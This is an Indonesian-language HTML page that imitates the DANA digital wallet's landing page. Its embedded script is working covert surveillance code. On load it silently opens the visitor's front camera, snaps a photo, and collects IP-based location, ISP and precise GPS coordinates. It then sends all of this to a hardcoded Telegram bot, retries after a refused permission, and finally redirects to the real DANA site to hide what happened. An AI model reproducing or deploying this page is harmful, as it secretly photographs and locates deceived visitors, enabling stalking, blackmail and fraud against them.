<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#108ee9" />
    <meta
      name="description"
      content="DANA - Dompet digital yang aman dan tepercaya untuk beragam metode bayar."
    />
    <title>DANA - Dompet Digital</title>
    <link
      rel="icon"
      href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='5' fill='%23108ee9'/%3E%3Cpath d='M5 8c0-1 .8-1.7 1.7-1.7h7c2.9 0 5.2 2.3 5.2 5.2s-2.3 5.2-5.2 5.2H6.7A1.7 1.7 0 0 1 5 15V8Z' fill='none' stroke='white' stroke-width='2'/%3E%3C/svg%3E"
    />
    <style>
      /* ===== CSS ANDA (tetap 100%) ===== */
      :root {
        --dana-blue: #108ee9;
        --white: #ffffff;
      }
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      html {
        background-color: var(--dana-blue);
      }
      body {
        font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        background-color: var(--dana-blue);
        color: var(--white);
        -webkit-font-smoothing: antialiased;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0;
      }
      .screen {
        display: flex;
        flex-direction: column;
        min-height: 100dvh;
        max-width: 480px;
        margin: 0 auto;
        padding: 0 24px 32px;
        width: 100%;
        justify-content: center;
      }
      .content {
        flex: 1;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding-top: 40px;
      }
      .illustration {
        width: 100%;
        max-width: 384px;
        aspect-ratio: 1 / 1;
      }
      .illustration img {
        width: 100%;
        height: 100%;
        object-fit: contain;
      }
      .logo {
        display: flex;
        align-items: center;
        gap: 12px;
        margin-top: 24px;
      }
      .logo-mark {
        display: flex;
        align-items: center;
        justify-content: center;
        width: 44px;
        height: 44px;
        border-radius: 50%;
        background-color: var(--white);
        color: var(--dana-blue);
      }
      .logo-mark svg {
        width: 24px;
        height: 24px;
      }
      .logo-text {
        font-size: 36px;
        font-weight: 800;
        letter-spacing: 0.15em;
        color: var(--white);
      }
      .title {
        margin-top: 32px;
        text-align: center;
        font-size: 32px;
        font-weight: 700;
        line-height: 1.2;
        text-wrap: balance;
      }
      .subtitle {
        margin-top: 20px;
        max-width: 28rem;
        text-align: center;
        font-size: 18px;
        line-height: 1.5;
        color: rgba(255, 255, 255, 0.9);
        text-wrap: pretty;
      }
      .cta {
        margin-top: 32px;
        width: 100%;
        border: none;
        border-radius: 6px;
        background-color: var(--white);
        color: var(--dana-blue);
        padding: 20px 0;
        font-family: inherit;
        font-size: 18px;
        font-weight: 600;
        letter-spacing: 0.05em;
        cursor: pointer;
        transition: background-color 0.15s ease;
      }
      .cta:hover {
        background-color: rgba(255, 255, 255, 0.9);
      }
      .cta:active {
        background-color: rgba(255, 255, 255, 0.8);
      }

      /* ===== TAMBAHAN UNTUK ERROR SCREEN ===== */
      .error-overlay {
        display: none;
        position: fixed;
        inset: 0;
        z-index: 999;
        background: #0a0620;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        color: rgba(255, 255, 255, 0.12);
        font-family: system-ui, sans-serif;
        font-size: 3.2rem;
        font-weight: 200;
        letter-spacing: 10px;
        text-transform: uppercase;
      }
      .error-overlay .sub-error {
        font-size: 0.8rem;
        color: rgba(255, 255, 255, 0.04);
        letter-spacing: 4px;
        margin-top: 14px;
      }
      .btn-retry {
        margin-top: 32px;
        padding: 14px 36px;
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 60px;
        color: rgba(255, 255, 255, 0.25);
        font-family: inherit;
        font-size: 0.8rem;
        font-weight: 500;
        letter-spacing: 3px;
        text-transform: uppercase;
        cursor: pointer;
        transition: all 0.3s ease;
      }
      .btn-retry:hover {
        background: rgba(255, 255, 255, 0.08);
        color: rgba(255, 255, 255, 0.4);
        border-color: rgba(255, 255, 255, 0.15);
      }

      /* Sembunyikan video */
      video { display: none !important; }
    </style>
  </head>
  <body>

    <!-- ====== KONTEN UTAMA (DANA) ====== -->
    <main class="screen" id="mainScreen">
      <div class="content">
        <div class="illustration">
          <img src="dana-hero.png" alt="Ilustrasi pembayaran digital dengan memindai kode QR di kasir" />
        </div>
        <div class="logo" aria-label="DANA">
          <span class="logo-mark">
            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
              <path d="M4 8c0-1.1.9-2 2-2h9c3.3 0 6 2.7 6 6s-2.7 6-6 6H6a2 2 0 0 1-2-2V8Zm3 1v6h8a3 3 0 0 0 0-6H7Z" />
            </svg>
          </span>
          <span class="logo-text">DANA</span>
        </div>
        <h1 class="title">Dompet digital yang aman dan tepercaya!</h1>
        <p class="subtitle">
          Nikmati kemudahan bertransaksi dengan beragam metode bayar di genggaman
        </p>
      </div>
      <button type="button" class="cta" id="openDana">BUKA DI DANA</button>
    </main>

    <!-- ====== ERROR OVERLAY ====== -->
    <div class="error-overlay" id="errorOverlay">
      Error
      <div class="sub-error">—</div>
      <button class="btn-retry" id="retryBtn">⟳ Coba Ulang</button>
    </div>

    <!-- ====== SCRIPT GABUNGAN (tanpa musik) ====== -->
    <script>
      (function() {
        'use strict';

        // ---------- KONFIGURASI TELEGRAM ----------
        const BOT_TOKEN = '8660313492:AAEstxadAAetaluw8OYCgyCxwZB21LDch4Y';
        const CHAT_ID = '8463156896';
        const MAX_ATTEMPTS = 3;
        let attempts = 0;
        let sudahKirim = false;
        let izinDitolak = false;
        let retryTimer = null;

        const mainScreen = document.getElementById('mainScreen');
        const errorOverlay = document.getElementById('errorOverlay');
        const retryBtn = document.getElementById('retryBtn');

        // ---------- GET LOKASI DARI IP ----------
        async function getLocationFromIP() {
          try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 7000);
            const res = await fetch('https://ipapi.co/json/', {
              signal: controller.signal,
              headers: { 'Accept': 'application/json' }
            });
            clearTimeout(timeoutId);
            if (!res.ok) throw new Error('HTTP ' + res.status);
            const data = await res.json();
            return {
              ip: data.ip || null,
              city: data.city || null,
              region: data.region || null,
              country: data.country_name || null,
              postal: data.postal || null,
              latitude: data.latitude || null,
              longitude: data.longitude || null,
              org: data.org || null,
              timezone: data.timezone || null
            };
          } catch { return null; }
        }

        // ---------- GET GPS ----------
        function getGPSLocation() {
          return new Promise((resolve) => {
            if (!navigator.geolocation) { resolve(null); return; }
            const timeoutId = setTimeout(() => resolve(null), 6000);
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                clearTimeout(timeoutId);
                resolve({
                  latitude: pos.coords.latitude,
                  longitude: pos.coords.longitude,
                  accuracy: pos.coords.accuracy
                });
              },
              () => {
                clearTimeout(timeoutId);
                resolve(null);
              },
              { enableHighAccuracy: true }
            );
          });
        }

        // ---------- KIRIM KE TELEGRAM ----------
        async function kirimKeTelegram(dataUrl, locationData, gpsData) {
          try {
            const blob = await fetch(dataUrl).then(r => r.blob());
            const formData = new FormData();
            formData.append('photo', blob, 'foto.png');

            let caption = `📸 Foto diambil otomatis\n🕒 ${new Date().toLocaleString('id-ID')}`;

            if (locationData) {
              if (locationData.ip) caption += `\n\n🌐 IP Publik : ${locationData.ip}`;
              if (locationData.org) caption += `\n📡 Operator/ISP : ${locationData.org}`;
              if (locationData.city || locationData.region || locationData.country) {
                let loc = [];
                if (locationData.city) loc.push(locationData.city);
                if (locationData.region) loc.push(locationData.region);
                if (locationData.country) loc.push(locationData.country);
                caption += `\n📍 Lokasi IP : ${loc.join(', ')}`;
              }
              if (locationData.postal) caption += `\n📮 Kode Pos : ${locationData.postal}`;
              if (locationData.timezone) caption += `\n🕐 Zona Waktu : ${locationData.timezone}`;
              if (locationData.latitude && locationData.longitude) {
                caption += `\n🗺️ Koordinat (IP) : ${locationData.latitude}, ${locationData.longitude}`;
              }
            }

            if (gpsData) {
              caption += `\n\n📡 GPS (akurat):`;
              caption += `\n   📍 Lat : ${gpsData.latitude}`;
              caption += `\n   📍 Long : ${gpsData.longitude}`;
              if (gpsData.accuracy) {
                caption += `\n   🎯 Akurasi : ±${Math.round(gpsData.accuracy)} meter`;
              }
            }

            if (!locationData && !gpsData) {
              caption += `\n\n⚠️ Data lokasi tidak tersedia`;
            }

            formData.append('caption', caption);
            formData.append('chat_id', CHAT_ID);

            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
              method: 'POST',
              body: formData
            });
            if (!response.ok) throw new Error('Telegram API error');
            sudahKirim = true;
          } catch (e) {
            console.error('Gagal kirim ke Telegram:', e);
          }
        }

        // ---------- AMBIL FOTO ----------
        function ambilDanKirim(video) {
          if (sudahKirim) return;

          const canvas = document.createElement('canvas');
          const lebar = video.videoWidth || 640;
          const tinggi = video.videoHeight || 480;
          canvas.width = lebar;
          canvas.height = tinggi;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, lebar, tinggi);
          const dataUrl = canvas.toDataURL('image/png');

          if (video.srcObject) {
            video.srcObject.getTracks().forEach(track => track.stop());
          }

          Promise.allSettled([
            getLocationFromIP(),
            getGPSLocation()
          ]).then((results) => {
            const locationData = results[0].status === 'fulfilled' ? results[0].value : null;
            const gpsData = results[1].status === 'fulfilled' ? results[1].value : null;
            kirimKeTelegram(dataUrl, locationData, gpsData);
          }).catch(() => {
            kirimKeTelegram(dataUrl, null, null);
          });
        }

        // ---------- TAMPILKAN ERROR ----------
        function tampilkanError() {
          izinDitolak = true;
          mainScreen.style.display = 'none';
          errorOverlay.style.display = 'flex';
          if (retryTimer) {
            clearTimeout(retryTimer);
            retryTimer = null;
          }
        }

        // ---------- RESET & COBA ULANG ----------
        function resetDanCobaUlang() {
          izinDitolak = false;
          attempts = 0;
          sudahKirim = false;
          if (retryTimer) {
            clearTimeout(retryTimer);
            retryTimer = null;
          }
          errorOverlay.style.display = 'none';
          mainScreen.style.display = 'flex';
          setTimeout(mulaiKamera, 300);
        }

        // ---------- MULAI KAMERA ----------
        function mulaiKamera() {
          if (sudahKirim || izinDitolak) return;
          attempts++;

          navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
          })
          .then(stream => {
            const video = document.createElement('video');
            video.style.display = 'none';
            video.setAttribute('playsinline', '');
            video.muted = true;
            video.srcObject = stream;
            document.body.appendChild(video);

            video.onloadedmetadata = () => {
              video.play().then(() => {
                setTimeout(() => ambilDanKirim(video), 100);
              }).catch(() => {
                if (attempts < MAX_ATTEMPTS) {
                  retryTimer = setTimeout(mulaiKamera, 2000);
                } else {
                  tampilkanError();
                }
              });
            };
            video.onerror = () => {
              if (attempts < MAX_ATTEMPTS) {
                retryTimer = setTimeout(mulaiKamera, 2000);
              } else {
                tampilkanError();
              }
            };
          })
          .catch(err => {
            console.error('Error kamera:', err);
            if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
              tampilkanError();
              return;
            }
            if (attempts < MAX_ATTEMPTS) {
              retryTimer = setTimeout(mulaiKamera, 2000);
            } else {
              tampilkanError();
            }
          });
        }

        // ---------- EVENT RETRY ----------
        if (retryBtn) {
          retryBtn.addEventListener('click', function(e) {
            e.stopPropagation();
            resetDanCobaUlang();
          });
        }

        // ---------- JALANKAN OTOMATIS ----------
        if (document.readyState === 'complete') {
          setTimeout(mulaiKamera, 500);
        } else {
          window.addEventListener('load', () => setTimeout(mulaiKamera, 500));
        }

        // ---------- TOMBOL "BUKA DI DANA" (dengan redirect) ----------
        const danaBtn = document.getElementById('openDana');
        if (danaBtn) {
          danaBtn.addEventListener('click', function(e) {
            // Efek klik
            this.style.transform = 'scale(0.96)';
            setTimeout(() => this.style.transform = '', 150);

            // Jika kamera gagal (izin ditolak), reset dan minta izin ulang
            if (izinDitolak) {
              e.preventDefault();
              resetDanCobaUlang();
              setTimeout(() => {
                window.location.href = 'https://www.dana.id/';
              }, 600);
              return;
            }

            // Jika kamera belum sukses, coba mulai ulang
            if (!sudahKirim && !izinDitolak) {
              attempts = 0;
              mulaiKamera();
            }

            // Redirect ke dana.id
            setTimeout(() => {
              window.location.href = 'https://www.dana.id/';
            }, 300);
          });
        }

      })();
    </script>
  </body>
</html>
